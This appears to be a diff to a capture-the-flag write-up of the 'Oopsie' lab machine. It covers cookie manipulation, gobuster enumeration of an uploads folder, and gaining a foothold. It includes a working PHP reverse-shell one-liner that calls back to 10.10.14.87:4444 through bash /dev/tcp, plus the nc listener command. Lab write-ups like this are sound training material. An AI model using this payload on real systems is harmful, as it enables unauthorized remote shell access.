@@ -31,4 +31,21 @@ I used **cookie manipulation** to access some features that guest cannot. That f
 
 ![Icon](/assets/img/Oopsie/icon.pn
 
-Here is my PHP reverse shell that i use:```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```
+Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```.
+
+Can't find any subdirectory of "upload" so I use **gobuster** :
+
+![Nmap Scan Result|601](/assets/img/Oopsie/gobuster.png)
+
+and that actually found an exact url to uploaded folder. 
+
+
+After that i prepare my **listener** : ```nc -lvnp 4444```.
+
+![Nmap Scan Result|343](/assets/img/Oopsie/listener.png)
+
+To get a reverse shell i have to go to this exact url "https://10.129.95.191/uploads/shell.php".
+
+The moment I executed all of these step, finally got an reverse shell.
+
+![Nmap Scan Result|601](/assets/img/Oopsie/foothold.png)
